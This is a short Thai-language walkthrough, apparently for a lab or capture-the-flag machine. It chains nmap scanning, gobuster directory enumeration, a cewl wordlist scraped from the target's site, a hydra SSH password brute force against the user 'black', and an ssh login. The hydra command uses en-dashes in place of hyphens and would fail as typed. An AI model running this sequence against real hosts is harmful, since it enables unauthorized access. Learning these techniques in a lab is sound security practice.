# Bruteforce hydra.

ขั้นตอนที่ 1 : nmap เพื่อค้นหาบริการและพอร์ตบนเครื่องเป้าหมาย

Command : nmap -sCV [ip_target]


***

ขั้นตอนที่ 2 : ใช้ gobuster เพื่อค้นหาเส้นทางหรือไดเร็กทอรีที่ซ่อนอยู่

Command : gobuster dir -u http://[ip_target]// -w /usr/share/wordlists/dirb/common.txt 

คำอธิบายเพิ่มเติม

 -w = ใช้เพื่อระบุเส้นทางไปยังไฟล์ wordlist ที่ Gobuster จะใช้สำหรับไดเร็กทอรีแบบ brute-force

 -u = ใช้เพื่อระบุ URL เป้าหมายหรือ URL พื้นฐานที่ Gobuster จะใช้ในการค้นหาไดเรคทอรี่ 

 -/usr/share/wordlists/dirb/common.txt = wordlists
 
<img width="787" height="202" alt="image" src="https://github.com/user-attachments/assets/2a4d16f3-2e03-4327-b71c-30719516b496" />

<img width="593" height="104" alt="540085575-f6839b99-e359-4159-84cc-47f77fe6dd03" src="https://github.com/user-attachments/assets/8b8798a9-f747-4fde-8d30-b66daa36ff19" />

***

ขั้นตอนที่ 3 : ใช้ cewl เพื่อสร้างรายการคำศัพท์ของรหัสผ่าน จากนั้นจึงคัดลอกไปสร้างเป็นไฟล์ .txt

Command : cewl http://[ip_target]/

<img width="1206" height="635" alt="540087752-a29f35d6-97a7-4b8c-998f-9529626aaec1" src="https://github.com/user-attachments/assets/baa9155c-02f7-42d0-9639-83fd3a0e7900" />

คำอธิบายเพิ่มเติม

 -cewl = รวบรวมคำจากเว็บ target มาสร้างเป็น wordlist เพื่อใช้เดารหัสผ่าน

3.1) ใส่ wordlist ทีได้มาในไฟล์ memory.txt

<img width="523" height="85" alt="image" src="https://github.com/user-attachments/assets/c6daef85-e874-41bb-b0b1-06dd01cb90c2" />

***

ขั้นตอนที่ 4 : ใช้ไฮดราเพื่อค้นหารหัสผ่านสำหรับผู้ใช้คำสั่ง black ต่อไปนี้

Command : hydra –l black –P /usr/bin/memory.txt [ip_target] ssh 

คำอธิบายเพิ่มเติม

 -l: ใช้เพื่อระบุชื่อผู้ใช้หรือชื่อเข้าสู่ระบบที่ Hydra จะใช้ในระหว่างการโจมตีแบบ brute-forcing 

 -P ใช้เพื่อระบุเส้นทางไปยังไฟล์รหัสผ่านที่ Hydra จะใช้สำหรับการโจมตีแบบ brute-forcing 
 
<img width="1488" height="589" alt="540087354-0d75e00b-293c-4469-9624-e1bdb344d039" src="https://github.com/user-attachments/assets/3df41c84-b492-4136-869c-7bbfd1a09f42" />

***

ขั้นตอนที่ 5 : หลังจากที่ได้ password ของเครื่องเป้าหมาย เราจะ ssh เพื่อเข้าถึงเครื่องเป้าหมาย 

Command : ssh black@[ip_target]






